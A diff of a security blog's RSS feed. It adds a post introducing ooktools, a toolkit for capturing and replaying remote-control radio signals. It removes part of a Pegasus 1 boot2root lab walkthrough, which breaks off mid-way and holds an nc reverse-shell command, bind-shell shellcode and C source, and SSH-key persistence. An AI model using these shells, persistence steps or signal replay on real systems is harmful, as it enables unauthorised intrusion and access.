@@ -6,8 +6,247 @@
     <description>Recent content on #!/slash/note</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 02 Oct 2016 16:05:22 +0200</lastBuildDate>
+    <lastBuildDate>Sat, 08 Oct 2016 11:15:00 +0200</lastBuildDate>
     <atom:link href="https://leonjza.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>introducing ooktools. on-off keying tools for your sdr</title>
+      <link>https://leonjza.github.io/blog/2016/10/08/introducing-ooktools.-on-off-keying-tools-for-your-sdr/</link>
+      <pubDate>Sat, 08 Oct 2016 11:15:00 +0200</pubDate>
+      
+      <guid>https://leonjza.github.io/blog/2016/10/08/introducing-ooktools.-on-off-keying-tools-for-your-sdr/</guid>
+      <description>&lt;p&gt;In a &lt;a href=&#34;https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/&#34;&gt;previous post&lt;/a&gt;, I spoke about a simple static key remote and how to replicate its signal using a small python script and RfCat. As part of the work done there, I set out to write a small tool that should help with some of the tasks involved with this process.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/banner.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Lets take a look at &lt;code&gt;ooktools&lt;/code&gt;, how to use it and the internals there of. For those in a rush, the repository can be found here: &lt;a href=&#34;https://github.com/leonjza/ooktools&#34;&gt;https://github.com/leonjza/ooktools&lt;/a&gt;.
+&lt;/p&gt;
+
+&lt;h2 id=&#34;major-features&#34;&gt;major features&lt;/h2&gt;
+
+&lt;p&gt;Some of the major features in &lt;code&gt;ooktools&lt;/code&gt; include:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Binary string extraction from wave file recordings.&lt;/li&gt;
+&lt;li&gt;Wave file cleanups to remove noise in On-off keying recordings.&lt;/li&gt;
+&lt;li&gt;Graphing capabilities for wave files.&lt;/li&gt;
+&lt;li&gt;General information extraction of wave files.&lt;/li&gt;
+&lt;li&gt;Signal recording and playback using &lt;code&gt;json&lt;/code&gt; definition files that can be shared.&lt;/li&gt;
+&lt;li&gt;Plotting of data from the previously mentioned &lt;code&gt;json&lt;/code&gt; recordings.&lt;/li&gt;
+&lt;li&gt;Signal searching for On-off keying type data.&lt;/li&gt;
+&lt;li&gt;Sending signals in both binary, complete PWM formatted or hex strings using an RfCat dongle.&lt;/li&gt;
+&lt;li&gt;Gnuradio &lt;code&gt;.grc&lt;/code&gt; template file generation.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Of course, as I get to spend more time on this, this list may grow and most of the functionality may actually be tested / perfected in environments outside of my lab. There are many cases where stuff breaks too. Checkout the &lt;em&gt;Known Issues&lt;/em&gt; section in the source repository.&lt;/p&gt;
+
+&lt;h2 id=&#34;installation&#34;&gt;installation&lt;/h2&gt;
+
+&lt;p&gt;Installing &lt;code&gt;ooktools&lt;/code&gt; &lt;em&gt;should&lt;/em&gt; be as simple as &lt;code&gt;pip install ooktools&lt;/code&gt;. This should take care of all of the dependencies except for &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat&#34;&gt;RfCat&lt;/a&gt;. For this you can either &lt;code&gt;apt install rfcat&lt;/code&gt; in Kali, or install from source from the &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat&#34;&gt;RfCat&lt;/a&gt; repository.&lt;/p&gt;
+
+&lt;h2 id=&#34;usage&#34;&gt;usage&lt;/h2&gt;
+
+&lt;p&gt;Using &lt;code&gt;ooktools&lt;/code&gt; should be as simple as just running it with the required arguments. Based on how you chose to install it you can either use the &lt;code&gt;ooktools&lt;/code&gt; command directly, or invoke the module from a cloned repository with &lt;code&gt;python -m ooktools.console&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ooktools --help
+         _   _           _
+ ___ ___| |_| |_ ___ ___| |___
+| . | . | &#39;_|  _| . | . | |_ -|
+|___|___|_,_|_| |___|___|_|___|
+On-off keying tools for your SD-arrrR
+https://github.com/leonjza/ooktools
+
+Usage: ooktools [OPTIONS] COMMAND [ARGS]...
+
+Options:
+  --help  Show this message and exit.
+
+Commands:
+  gnuradio  GNU Radio Commands.
+  signal    Signal Commands.
+  wave      Wave File Commands.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A number of &lt;em&gt;sub commands&lt;/em&gt; exist and are categorized according to their main functions. You can get help at any time by supplying the &lt;code&gt;--help&lt;/code&gt; argument. The below example shows help for the &lt;code&gt;signal&lt;/code&gt; sub command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ ooktools signal --help
+         _   _           _
+ ___ ___| |_| |_ ___ ___| |___
+| . | . | &#39;_|  _| . | . | |_ -|
+|___|___|_,_|_| |___|___|_|___|
+On-off keying tools for your SD-arrrR
+https://github.com/leonjza/ooktools
+
+Usage: ooktools signal [OPTIONS] COMMAND [ARGS]...
+
+  Signal Commands.
+
+Options:
+  --help  Show this message and exit.
+
+Commands:
+  play    Play frames from a source file.
+  plot    Plot frames from a recorded signal.
+  record  Record frames to a file.
+  search  Search for signals.
+  send    Send signals using a RFCat dongle.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;examples&#34;&gt;examples&lt;/h2&gt;
+
+&lt;p&gt;For the rest of the post, I am going to cover some examples to showcase what is possible with &lt;code&gt;ooktools&lt;/code&gt;. Like I have previously mentioned, a lot of the functionality and testing was done in my isolated lab environment, and may actually not work at all for you. Keep this in mind! ;)&lt;/p&gt;
+
+&lt;h3 id=&#34;wave-binary&#34;&gt;wave binary&lt;/h3&gt;
+
+&lt;p&gt;The &lt;code&gt;ooktools wave binary&lt;/code&gt; command can be used to attempt to extract the binary string from a wave file recording. Lets take a sample recording where I extracted a single pulse:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/audacity_single_pulse.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Spotting the key with your eye may be easy in this case, but its a lot harder with longer waves. Anyways, running &lt;code&gt;ooktools wave binary&lt;/code&gt; for this recording should output the binary sequence.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/ooktools_wave_binary.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h3 id=&#34;wave-clean&#34;&gt;wave clean&lt;/h3&gt;
+
+&lt;p&gt;The &lt;code&gt;ooktools wave clean&lt;/code&gt; command takes a source wave file and tries to &lt;em&gt;&amp;lsquo;square out&amp;rsquo;&lt;/em&gt; the signal, removing any jumps in the waveform.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/wave_clean.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The source and destinations files compared after this command can be seen in this screenshot:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/audacity_clean.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h3 id=&#34;wave-graph&#34;&gt;wave graph&lt;/h3&gt;
+
+&lt;p&gt;The &lt;code&gt;ooktools wave graph&lt;/code&gt; command plots the values read from a wave file source. You can interactively pan and zoom the graph to focus on specific areas as needed.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/wave_graph.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h3 id=&#34;signal-search&#34;&gt;signal search&lt;/h3&gt;
+
+&lt;p&gt;The &lt;code&gt;ooktools signal search&lt;/code&gt; commands attempts to find valid on-off keying packets while iterating over a frequency range that is specified. The definition of a &lt;em&gt;valid packet&lt;/em&gt; is currently still a little strange though. :|&lt;/p&gt;
+
+&lt;p&gt;To best show this feature, the following asciinema recording attempts to show the &lt;code&gt;signal search&lt;/code&gt; in action while I hold down the button on my remote:&lt;/p&gt;
+
+&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/88503.js&#34; id=&#34;asciicast-88503&#34; async&gt;&lt;/script&gt;
+
+&lt;h2 id=&#34;signal-record&#34;&gt;signal record&lt;/h2&gt;
+
+&lt;p&gt;The &lt;code&gt;ooktools signal record&lt;/code&gt; command allows you to record a number of frames to a file as you press down on a remote repeatedly. This can then be plotted or simply played back at a later stage.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/signal_record.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;signal-play&#34;&gt;signal play&lt;/h2&gt;
+
+&lt;p&gt;The &lt;code&gt;ooktools signal play&lt;/code&gt; command allows you to replay frames recorded using &lt;code&gt;ooktools signal record&lt;/code&gt;. It literally just plays the frames back.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/signal_play.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;signal-plot&#34;&gt;signal plot&lt;/h2&gt;
+
+&lt;p&gt;The &lt;code&gt;ooktools signal plot&lt;/code&gt; command allows you to create plots of the frames that were recorded using &lt;code&gt;ooktools signal record&lt;/code&gt;. This could be used to very quickly get an idea of the on-off key that may be present on a remote.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/signal_plot.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;signal-send&#34;&gt;signal send&lt;/h2&gt;
+
+&lt;p&gt;The &lt;code&gt;ooktools signal send&lt;/code&gt; sub command helps with sending signals either as binary codes, full PWM codes or hex strings. Example usage of the binary string method is:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/send_binary_data.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The same code as a hex string would be:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/ooktools/send_hex_data.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;internals-and-development&#34;&gt;internals and development&lt;/h2&gt;
+
+&lt;p&gt;I am sure as more time is spent on the toolkit it will evolve and become a little refined. However, if you wish to hack away at it, hopefully the following bit will help in getting you to understand how its put together.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;ooktools&lt;/code&gt; is build around the excellent python &lt;a href=&#34;http://click.pocoo.org/6/&#34;&gt;Click&lt;/a&gt; cli framework. The applications entry point as defined in &lt;code&gt;setup.py&lt;/code&gt; as the &lt;code&gt;cli()&lt;/code&gt; method in &lt;code&gt;ooktools.console&lt;/code&gt;. This is standard bootstrapping to reach the &lt;code&gt;cli()&lt;/code&gt; method. Commands themselves are decorated using the &lt;code&gt;@group.command()&lt;/code&gt; decorator and is grouped according to primary function.&lt;/p&gt;
+
+&lt;p&gt;Once you checked out the &lt;code&gt;console.py&lt;/code&gt; source, you may notice that this file only really handles the commands and arguments to other functions that are defined in &lt;code&gt;ooktools.commands&lt;/code&gt;. It is also responsible for calling the correct validation methods as defined in &lt;code&gt;ooktools.validators&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Once a command is happy with its arguments, the &lt;strong&gt;actual&lt;/strong&gt; work is then in the &lt;code&gt;ooktools.commands.category&lt;/code&gt; scripts.&lt;/p&gt;
+
+&lt;p&gt;As far as dependencies go, at the time of writing &lt;code&gt;ooktools&lt;/code&gt; depends on &lt;em&gt;bitstring&lt;/em&gt;, &lt;em&gt;click&lt;/em&gt;, &lt;em&gt;matplotlib&lt;/em&gt;, &lt;em&gt;numpy&lt;/em&gt; and &lt;em&gt;peakutils&lt;/em&gt;. There is also a requirement for &lt;code&gt;rflib&lt;/code&gt; which comes from the &lt;a href=&#34;https://bitbucket.org/atlas0fd00m/rfcat&#34;&gt;RfCat&lt;/a&gt; repository.&lt;/p&gt;</description>
+    </item>
     
     <item>
       <title>reverse engineering static key remotes with gnuradio and rfcat</title>
@@ -6045,833 +6284,6 @@ if __name__ == &amp;quot;__main__&amp;quot;:
 &lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;
 
 &lt;p&gt;Like I previously mentioned, with limited knowledge about smali and all that jazz, I was able to patch the application to not do the jailbreak detection it is intended to do. Removing jailbreak detection may not be such a big deal, but what else can you change, and how do you protect against that?&lt;/p&gt;</description>
-    </item>
-    
-    <item>
-      <title>hoof to root solving pegasus 1</title>
-      <link>https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/</link>
-      <pubDate>Tue, 23 Dec 2014 08:29:49 +0000</pubDate>
-      
-      <guid>https://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/</guid>
-      <description>&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/pegasus-1,109/&#34;&gt;Pegasus 1&lt;/a&gt; is a boot2root hosted on &lt;a href=&#34;https://www.vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; built by &lt;a href=&#34;https://twitter.com/theknapsy&#34;&gt;@TheKnapsy&lt;/a&gt;. He wrote a &lt;a href=&#34;http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/&#34;&gt;blogpost&lt;/a&gt; about it too containing a small introduction with Pegasus as his first boot2root (hoof2root? ;p).&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_logo.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Having recently played in the &lt;a href=&#34;https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/&#34;&gt;Offsec Playground&lt;/a&gt; a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&amp;hellip; &lt;em&gt;again&lt;/em&gt;. You will see this in the &lt;strong&gt;my_first&lt;/strong&gt; section.&lt;/p&gt;
-
-&lt;p&gt;Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!&lt;/p&gt;
-
-&lt;p&gt;Lets begin.&lt;/p&gt;
-
-&lt;p&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;nmap-again&#34;&gt;nmap, again&lt;/h2&gt;
-
-&lt;p&gt;Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&amp;hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap --reason -sV 192.168.56.101 -p-
-
-Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 09:16 SAST
-Nmap scan report for 192.168.56.101
-Host is up, received arp-response (0.00022s latency).
-Not shown: 65531 closed ports
-Reason: 65531 resets
-PORT      STATE SERVICE REASON  VERSION
-22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
-111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
-8088/tcp  open  http    syn-ack nginx 1.1.19
-55625/tcp open  status  syn-ack 1 (RPC #100024)
-MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;tcp/22&lt;/code&gt;, &lt;code&gt;tcp/111&lt;/code&gt;, &lt;code&gt;tcp/8088&lt;/code&gt; and &lt;code&gt;tcp/55625&lt;/code&gt;. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on &lt;code&gt;tcp/8088&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&#34;stomping-some-hoofs-with-pegasus&#34;&gt;stomping some hoofs with pegasus&lt;/h2&gt;
-
-&lt;p&gt;Browsing to &lt;a href=&#34;http://192.168.56.101:8088/&#34;&gt;http://192.168.56.101:8088/&lt;/a&gt;, we are presented with a picture of Pegasus:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_web.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;I manually tried to browse to things like &lt;code&gt;robots.txt&lt;/code&gt; etc, but everything responded with the same image. This was until I decided to browse to &lt;code&gt;index.php&lt;/code&gt;, in an attempt to check that the web server is configured to serve PHP content:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_nginx_index.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, &lt;code&gt;.php&lt;/code&gt; scripts would 404 correctly. With that in mind, it was time to reach for &lt;code&gt;wfuzz&lt;/code&gt; to discover some more.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.101:8088/FUZZ.php
-
-********************************************************
-* Wfuzz  2.0 - The Web Bruteforcer                     *
-********************************************************
-
-Target: http://192.168.56.101:8088/FUZZ.php
-Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt
-
-Total requests: 1660
-==================================================================
-ID  Response   Lines      Word         Chars          Request
-==================================================================
-
-01426:  C=200      0 L         4 W       19 Ch    &amp;quot; - submit&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And we have a HTTP 200 response for &lt;code&gt;submit.php&lt;/code&gt;. So, I browsed to &lt;a href=&#34;http://192.168.56.101:8088/submit.php:&#34;&gt;http://192.168.56.101:8088/submit.php:&lt;/a&gt;&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_submit.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Well that isn&amp;rsquo;t exactly useful. I played a little with the &lt;code&gt;submit.php&lt;/code&gt; by sending a POST with some &lt;code&gt;--data&lt;/code&gt;, but nothing useful came of it. Almost everything came back with &lt;code&gt;No data to process&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Admittedly, this was my first hurdle. I was thinking if there is a &lt;code&gt;submit.php&lt;/code&gt;, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&amp;rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. &lt;code&gt;wfuzz&lt;/code&gt; was working with &lt;code&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;, when finally I get a HTTP 200 for &lt;code&gt;codereview.php&lt;/code&gt;.&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_code_review.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;h2 id=&#34;pwning-mike&#34;&gt;pwning mike&lt;/h2&gt;
-
-&lt;p&gt;So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data &lt;code&gt;code&lt;/code&gt; to the previously found &lt;code&gt;submit.php&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.&lt;/p&gt;
-
-&lt;p&gt;PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute &lt;code&gt;/bin/nc 192.168.56.102 4444 -e /bin/sh&lt;/code&gt; or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.&lt;/p&gt;
-
-&lt;p&gt;Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to &lt;code&gt;system()&lt;/code&gt; in it:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/pegasus_code_review_security.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to &lt;a href=&#34;http://php.net/manual/en/function.system.php&#34;&gt;system&lt;/a&gt;, or C due to its &lt;a href=&#34;http://linux.die.net/man/3/system&#34;&gt;system&lt;/a&gt;. Obviously though, &lt;code&gt;system()&lt;/code&gt; is being filtered out, so I would need an alternative.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;insert fade to black&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;CAPTION: many hours later&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;stdio.h&amp;gt;
-
-// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
-unsigned char buf[] =
-&amp;quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&amp;quot;
-&amp;quot;\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&amp;quot;
-&amp;quot;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&amp;quot;
-&amp;quot;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&amp;quot;
-&amp;quot;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&amp;quot;
-&amp;quot;\x0b\xcd\x80&amp;quot;;
-
-int main()
-{
-    int (*ret)() = (int(*)())buf;
-    ret();
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This was supposed to open me a &lt;code&gt;tcp/4444&lt;/code&gt; shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&amp;rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on &lt;a href=&#34;http://bigpointyteeth.se/code/bindshell.c&#34;&gt;this&lt;/a&gt;. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &amp;lsquo;reviewed&amp;rsquo;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;// Source: http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;amp;cd=11&amp;amp;hl=en&amp;amp;ct=clnk&amp;amp;gl=za
-// http://bigpointyteeth.se/code/bindshell.c
-#include &amp;lt;sys/types.h&amp;gt;
-#include &amp;lt;sys/socket.h&amp;gt;
-#include &amp;lt;arpa/inet.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-
-#define SHELL &amp;quot;/bin/sh&amp;quot;   // shell to execute
-#define NAME &amp;quot;rsync&amp;quot;        // name of the forked bindshell shown in ps
-
-int main(int argc, char *argv[]) {
-    char msg[16];
-    int srv_sockfd, new_sockfd;
-    socklen_t new_addrlen;
-    struct sockaddr_in srv_addr, new_addr;
-
-    // fork into background
-    if (fork() == 0) {
-        if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) &amp;lt; 0) {
-            return -1;
-        }
-
-        srv_addr.sin_family = PF_INET;
-        srv_addr.sin_port = htons(atoi(&amp;quot;4444&amp;quot;));
-        srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
-
-        if (bind(srv_sockfd, (struct sockaddr *)&amp;amp;srv_addr, sizeof(srv_addr)) &amp;lt; 0) {
-            return -1;
-        }
-
-        if (listen(srv_sockfd, 1) &amp;lt; 0) {
-            return -1;
-        }
-
-        // accept loop
-        for (;;) {
-            new_addrlen = sizeof(new_addr);
-            new_sockfd = accept(srv_sockfd, (struct sockaddr *)&amp;amp;new_addr, &amp;amp;new_addrlen);
-            if (new_sockfd &amp;lt; 0) {
-                return -1;
-            }
-
-            // fork to handle new connection
-            if (fork() == 0) {
-                // close old listener
-                close(srv_sockfd);
-                // print the parent pid which should be killed in order
-                // to remove the persistant bindshell listener
-                sprintf(msg, &amp;quot;ppid=%d\n&amp;quot;, getppid());
-                write(new_sockfd, msg, strlen(msg));
-
-                dup2(new_sockfd, 2);
-                dup2(new_sockfd, 1);
-                dup2(new_sockfd, 0);
-
-                execl(SHELL, NAME, NULL);
-                return 0;
-            }
-            else
-                close(new_sockfd);
-        } // end accept loop
-    } // end fork into background
-    return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;All of my attempts were followed by a nmap on &lt;code&gt;tcp/4444&lt;/code&gt; to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.101 -p 4444
-
-Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-23 11:33 SAST
-Nmap scan report for 192.168.56.101
-Host is up (0.00034s latency).
-PORT     STATE SERVICE
-4444/tcp open  krb524
-MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
-
-Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Awesome, so lets connect and see what we have:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -v 192.168.56.101 4444
-192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
-(UNKNOWN) [192.168.56.101] 4444 (?) open
-ppid=10450
-id
-uid=1001(mike) gid=1001(mike) groups=1001(mike)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;As was hoped for, a shell as &lt;code&gt;mike&lt;/code&gt;. I quickly generated a new ssh key pair for Pegasus, and cat the public key to &lt;code&gt;mike&lt;/code&gt;&amp;rsquo;s &lt;code&gt;authorized_keys&lt;/code&gt; file and went on to SSH in as mike:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# first I cat the public key so that I can copy it
-root@kali:~# cat pegasus.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali
-
-# next I connect to the bind shell listener and move to Mikes .shh directory
-root@kali:~# nc -v 192.168.56.101 4444
-192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
-(UNKNOWN) [192.168.56.101] 4444 (?) open
-ppid=10450
-cd .ssh
-
-# next we append my public key to mikes authorized_keys
-echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&amp;quot; &amp;gt;&amp;gt; authorized_keys
-ls -lh
-total 12K
--rw-rw-r-- 1 mike mike  381 Dec 23 20:36 authorized_keys
--rw------- 1 mike mike 1.7K Nov 18 12:39 id_rsa
--rw-r--r-- 1 mike mike  222 Nov 18 17:39 known_hosts
-chmod 600 authorized_keys
-^C
-
-# with the authorized_keys ready, I SSH in as mike using my key pair
-root@kali:~# ssh mike@192.168.56.101 -i pegasus
-Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)
-
